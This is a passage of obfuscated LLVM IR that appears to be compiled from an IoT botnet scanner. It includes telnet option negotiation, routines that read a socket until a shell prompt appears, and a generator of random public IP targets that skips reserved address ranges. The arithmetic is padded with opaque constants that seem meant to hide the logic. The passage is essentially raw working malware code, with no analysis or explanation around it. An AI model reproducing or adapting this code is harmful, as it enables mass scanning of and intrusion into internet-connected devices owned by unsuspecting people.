  %52 = load i32*, i32** %3, align 8
  %53 = load i64, i64* @numpids, align 8
  %54 = sub i64 0, 1
  %55 = add i64 %53, %54
  %56 = sub i64 %53, 1
  %57 = getelementptr inbounds i32, i32* %52, i64 %55
  store i32 %51, i32* %57, align 4
  %58 = load i32*, i32** @pids, align 8
  %59 = bitcast i32* %58 to i8*
  call void @free(i8* %59) #2
  %60 = load i32*, i32** %3, align 8
  store i32* %60, i32** @pids, align 8
  %61 = load i32, i32* %2, align 4
  store i32 %61, i32* %1, align 4
  br label %62

; <label>:62:                                     ; preds = %50, %8
  %63 = load i32, i32* %1, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.72, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %114, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %121

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %85, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %83

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = add i64 0, %29
  %31 = sub i64 0, %28
  %32 = getelementptr inbounds i8, i8* %26, i64 %30
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %81, label %36

; <label>:36:                                     ; preds = %22
  %37 = load i8*, i8** %3, align 8
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i8, i8* %37, i64 %39
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = add i64 0, 5449932784881226094
  %44 = sub i64 %43, %42
  %45 = sub i64 %44, 5449932784881226094
  %46 = sub i64 0, %42
  %47 = getelementptr inbounds i8, i8* %40, i64 %45
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 32
  br i1 %50, label %81, label %51

; <label>:51:                                     ; preds = %36
  %52 = load i8*, i8** %3, align 8
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i32, i32* %7, align 4
  %57 = sext i32 %56 to i64
  %58 = sub i64 0, -6772382314532119744
  %59 = sub i64 %58, %57
  %60 = add i64 %59, -6772382314532119744
  %61 = sub i64 0, %57
  %62 = getelementptr inbounds i8, i8* %55, i64 %60
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 13
  br i1 %65, label %81, label %66

; <label>:66:                                     ; preds = %51
  %67 = load i8*, i8** %3, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = sub i64 0, -8973759853807779262
  %74 = sub i64 %73, %72
  %75 = add i64 %74, -8973759853807779262
  %76 = sub i64 0, %72
  %77 = getelementptr inbounds i8, i8* %70, i64 %75
  %78 = load i8, i8* %77, align 1
  %79 = sext i8 %78 to i32
  %80 = icmp eq i32 %79, 10
  br label %81

; <label>:81:                                     ; preds = %66, %51, %36, %22
  %82 = phi i1 [ true, %51 ], [ true, %36 ], [ true, %22 ], [ %80, %66 ]
  br label %83

; <label>:83:                                     ; preds = %81, %18
  %84 = phi i1 [ false, %18 ], [ %82, %81 ]
  br i1 %84, label %85, label %91

; <label>:85:                                     ; preds = %83
  %86 = load i32, i32* %7, align 4
  %87 = add i32 %86, -1644082933
  %88 = add i32 %87, 1
  %89 = sub i32 %88, -1644082933
  %90 = add nsw i32 %86, 1
  store i32 %89, i32* %7, align 4
  br label %18

; <label>:91:                                     ; preds = %83
  %92 = load i8*, i8** %3, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i32, i32* %7, align 4
  %97 = sext i32 %96 to i64
  %98 = add i64 0, 5802175201642356869
  %99 = sub i64 %98, %97
  %100 = sub i64 %99, 5802175201642356869
  %101 = sub i64 0, %97
  %102 = getelementptr inbounds i8, i8* %95, i64 %100
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = load i8*, i8** %4, align 8
  %106 = load i32, i32* %6, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %105, i64 %107
  %109 = load i8, i8* %108, align 1
  %110 = sext i8 %109 to i32
  %111 = icmp eq i32 %104, %110
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %91
  store i32 1, i32* %2, align 4
  br label %122

; <label>:113:                                    ; preds = %91
  br label %114

; <label>:114:                                    ; preds = %113
  %115 = load i32, i32* %6, align 4
  %116 = sub i32 0, %115
  %117 = sub i32 0, 1
  %118 = add i32 %116, %117
  %119 = sub i32 0, %118
  %120 = add nsw i32 %115, 1
  store i32 %119, i32* %6, align 4
  br label %11

; <label>:121:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %122

; <label>:122:                                    ; preds = %121, %112
  %123 = load i32, i32* %2, align 4
  ret i32 %123
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %161, %8
  %34 = load i32, i32* %18, align 4
  %35 = sub i32 %34, -1656802881
  %36 = add i32 %35, 2
  %37 = add i32 %36, -1656802881
  %38 = add nsw i32 %34, 2
  %39 = load i32, i32* %16, align 4
  %40 = icmp slt i32 %37, %39
  br i1 %40, label %41, label %51

; <label>:41:                                     ; preds = %33
  %42 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %43 = load i64, i64* %42, align 8
  %44 = icmp sgt i64 %43, 0
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %47 = load i64, i64* %46, align 8
  %48 = icmp sgt i64 %47, 0
  br label %49

; <label>:49:                                     ; preds = %45, %41
  %50 = phi i1 [ true, %41 ], [ %48, %45 ]
  br label %51

; <label>:51:                                     ; preds = %49, %33
  %52 = phi i1 [ false, %33 ], [ %50, %49 ]
  br i1 %52, label %53, label %162

; <label>:53:                                     ; preds = %51
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !4
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %24, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %25, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %10, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %69 = load i32, i32* %10, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = xor i64 %73, -1
  %75 = xor i64 %67, -1
  %76 = xor i64 -3517579864760869596, -1
  %77 = and i64 %74, -3517579864760869596
  %78 = and i64 %73, %76
  %79 = and i64 %75, -3517579864760869596
  %80 = and i64 %67, %76
  %81 = or i64 %77, %78
  %82 = or i64 %79, %80
  %83 = xor i64 %81, %82
  %84 = or i64 %74, %75
  %85 = xor i64 %84, -1
  %86 = or i64 -3517579864760869596, %76
  %87 = and i64 %85, %86
  %88 = or i64 %83, %87
  %89 = or i64 %73, %67
  store i64 %88, i64* %72, align 8
  %90 = load i32, i32* %10, align 4
  %91 = sub i32 0, 1
  %92 = sub i32 %90, %91
  %93 = add nsw i32 %90, 1
  %94 = call i32 @select(i32 %92, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %95 = icmp slt i32 %94, 1
  br i1 %95, label %96, label %97

; <label>:96:                                     ; preds = %63
  br label %162

; <label>:97:                                     ; preds = %63
  %98 = load i8*, i8** %15, align 8
  %99 = load i32, i32* %18, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8, i8* %98, i64 %100
  store i8* %101, i8** %23, align 8
  %102 = load i32, i32* %10, align 4
  %103 = load i8*, i8** %23, align 8
  %104 = call i64 @recv(i32 %102, i8* %103, i64 1, i32 0)
  %105 = trunc i64 %104 to i32
  store i32 %105, i32* %19, align 4
  %106 = load i32, i32* %19, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %111, label %108

; <label>:108:                                    ; preds = %97
  %109 = load i32, i32* %19, align 4
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %108, %97
  store i32 0, i32* %9, align 4
  br label %167

; <label>:112:                                    ; preds = %108
  %113 = load i32, i32* %19, align 4
  %114 = load i32, i32* %18, align 4
  %115 = sub i32 %114, -1289930996
  %116 = add i32 %115, %113
  %117 = add i32 %116, -1289930996
  %118 = add nsw i32 %114, %113
  store i32 %117, i32* %18, align 4
  %119 = load i8*, i8** %23, align 8
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 255
  br i1 %122, label %123, label %147

; <label>:123:                                    ; preds = %112
  %124 = load i32, i32* %10, align 4
  %125 = load i8*, i8** %23, align 8
  %126 = getelementptr inbounds i8, i8* %125, i64 1
  %127 = call i64 @recv(i32 %124, i8* %126, i64 2, i32 0)
  %128 = trunc i64 %127 to i32
  store i32 %128, i32* %19, align 4
  %129 = load i32, i32* %19, align 4
  %130 = icmp eq i32 %129, -1
  br i1 %130, label %134, label %131

; <label>:131:                                    ; preds = %123
  %132 = load i32, i32* %19, align 4
  %133 = icmp eq i32 %132, 0
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %131, %123
  store i32 0, i32* %9, align 4
  br label %167

; <label>:135:                                    ; preds = %131
  %136 = load i32, i32* %19, align 4
  %137 = load i32, i32* %18, align 4
  %138 = sub i32 0, %136
  %139 = sub i32 %137, %138
  %140 = add nsw i32 %137, %136
  store i32 %139, i32* %18, align 4
  %141 = load i32, i32* %10, align 4
  %142 = load i8*, i8** %23, align 8
  %143 = call i32 @negotiate(i32 %141, i8* %142, i32 3)
  %144 = icmp ne i32 %143, 0
  br i1 %144, label %146, label %145

; <label>:145:                                    ; preds = %135
  store i32 0, i32* %9, align 4
  br label %167

; <label>:146:                                    ; preds = %135
  br label %161

; <label>:147:                                    ; preds = %112
  %148 = load i8*, i8** %15, align 8
  %149 = load i8*, i8** %11, align 8
  %150 = call i8* @strstr(i8* %148, i8* %149) #10
  %151 = icmp ne i8* %150, null
  br i1 %151, label %159, label %152

; <label>:152:                                    ; preds = %147
  %153 = load i32, i32* %12, align 4
  %154 = icmp ne i32 %153, 0
  br i1 %154, label %155, label %160

; <label>:155:                                    ; preds = %152
  %156 = load i8*, i8** %15, align 8
  %157 = call i32 @matchPrompt(i8* %156)
  %158 = icmp ne i32 %157, 0
  br i1 %158, label %159, label %160

; <label>:159:                                    ; preds = %155, %147
  store i32 1, i32* %20, align 4
  br label %162

; <label>:160:                                    ; preds = %155, %152
  br label %161

; <label>:161:                                    ; preds = %160, %146
  br label %33

; <label>:162:                                    ; preds = %159, %96, %51
  %163 = load i32, i32* %20, align 4
  %164 = icmp ne i32 %163, 0
  br i1 %164, label %165, label %166

; <label>:165:                                    ; preds = %162
  store i32 1, i32* %9, align 4
  br label %167

; <label>:166:                                    ; preds = %162
  store i32 0, i32* %9, align 4
  br label %167

; <label>:167:                                    ; preds = %166, %165, %145, %134, %111
  %168 = load i32, i32* %9, align 4
  ret i32 %168
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [4 x i8], align 1
  %2 = alloca [16 x i8], align 16
  %3 = bitcast [4 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 4, i32 1, i1 false)
  %4 = call i32 @rand() #2
  %5 = srem i32 %4, 255
  %6 = trunc i32 %5 to i8
  %7 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %6, i8* %7, align 1
  %8 = call i32 @rand() #2
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  %11 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %10, i8* %11, align 1
  %12 = call i32 @rand() #2
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  %15 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %14, i8* %15, align 1
  %16 = call i32 @rand() #2
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  %19 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %18, i8* %19, align 1
  br label %20

; <label>:20:                                     ; preds = %167, %0
  %21 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %165, label %25

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 10
  br i1 %29, label %165, label %30

; <label>:30:                                     ; preds = %25
  %31 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 100
  br i1 %34, label %35, label %45

; <label>:35:                                     ; preds = %30
  %36 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp sge i32 %38, 64
  br i1 %39, label %40, label %45

; <label>:40:                                     ; preds = %35
  %41 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp sle i32 %43, 127
  br i1 %44, label %165, label %45

; <label>:45:                                     ; preds = %40, %35, %30
  %46 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 127
  br i1 %49, label %165, label %50

; <label>:50:                                     ; preds = %45
  %51 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 169
  br i1 %54, label %55, label %60

; <label>:55:                                     ; preds = %50
  %56 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 254
  br i1 %59, label %165, label %60

; <label>:60:                                     ; preds = %55, %50
  %61 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 172
  br i1 %64, label %65, label %75

; <label>:65:                                     ; preds = %60
  %66 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sle i32 %68, 16
  br i1 %69, label %70, label %75

; <label>:70:                                     ; preds = %65
  %71 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp sle i32 %73, 31
  br i1 %74, label %165, label %75

; <label>:75:                                     ; preds = %70, %65, %60
  %76 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %77 = load i8, i8* %76, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp eq i32 %78, 192
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %75
  %81 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %90

; <label>:85:                                     ; preds = %80
  %86 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 2
  br i1 %89, label %165, label %90

; <label>:90:                                     ; preds = %85, %80, %75
  %91 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %92 = load i8, i8* %91, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 192
  br i1 %94, label %95, label %105

; <label>:95:                                     ; preds = %90
  %96 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 88
  br i1 %99, label %100, label %105

; <label>:100:                                    ; preds = %95
  %101 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 99
  br i1 %104, label %165, label %105

; <label>:105:                                    ; preds = %100, %95, %90
  %106 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 192
  br i1 %109, label %110, label %115

; <label>:110:                                    ; preds = %105
  %111 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 168
  br i1 %114, label %165, label %115

; <label>:115:                                    ; preds = %110, %105
  %116 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %117 = load i8, i8* %116, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 198
  br i1 %119, label %120, label %130

; <label>:120:                                    ; preds = %115
  %121 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 18
  br i1 %124, label %165, label %125

; <label>:125:                                    ; preds = %120
  %126 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 19
  br i1 %129, label %165, label %130

; <label>:130:                                    ; preds = %125, %115
  %131 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %132 = load i8, i8* %131, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 198
  br i1 %134, label %135, label %145

; <label>:135:                                    ; preds = %130
  %136 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %137 = load i8, i8* %136, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 51
  br i1 %139, label %140, label %145

; <label>:140:                                    ; preds = %135
  %141 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %142 = load i8, i8* %141, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 100
  br i1 %144, label %165, label %145

; <label>:145:                                    ; preds = %140, %135, %130
  %146 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 203
  br i1 %149, label %150, label %160

; <label>:150:                                    ; preds = %145
  %151 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %160

; <label>:155:                                    ; preds = %150
  %156 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %157 = load i8, i8* %156, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp eq i32 %158, 113
  br i1 %159, label %165, label %160

; <label>:160:                                    ; preds = %155, %150, %145
  %161 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp sge i32 %163, 224
  br label %165

; <label>:165:                                    ; preds = %160, %155, %140, %125, %120, %110, %100, %85, %70, %55, %45, %40, %25, %20
  %166 = phi i1 [ true, %155 ], [ true, %140 ], [ true, %125 ], [ true, %120 ], [ true, %110 ], [ true, %100 ], [ true, %85 ], [ true, %70 ], [ true, %55 ], [ true, %45 ], [ true, %40 ], [ true, %25 ], [ true, %20 ], [ %164, %160 ]
  br i1 %166, label %167, label %184

; <label>:167:                                    ; preds = %165
  %168 = call i32 @rand() #2
  %169 = srem i32 %168, 255
  %170 = trunc i32 %169 to i8
  %171 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %170, i8* %171, align 1
  %172 = call i32 @rand() #2
  %173 = srem i32 %172, 255
  %174 = trunc i32 %173 to i8
  %175 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %174, i8* %175, align 1
  %176 = call i32 @rand() #2
  %177 = srem i32 %176, 255
  %178 = trunc i32 %177 to i8
  %179 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %178, i8* %179, align 1
  %180 = call i32 @rand() #2
  %181 = srem i32 %180, 255
  %182 = trunc i32 %181 to i8
  %183 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %182, i8* %183, align 1
  br label %20

; <label>:184:                                    ; preds = %165
  %185 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %185, i8 0, i64 16, i32 16, i1 false)
  %186 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %187 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %188 = load i8, i8* %187, align 1
  %189 = zext i8 %188 to i32
  %190 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = call i32 (i8*, i8*, ...) @szprintf(i8* %186, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.73, i32 0, i32 0), i32 %189, i32 %192, i32 %195, i32 %198)
  %200 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %201 = call i32 @inet_addr(i8* %200) #2
  ret i32 %201
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
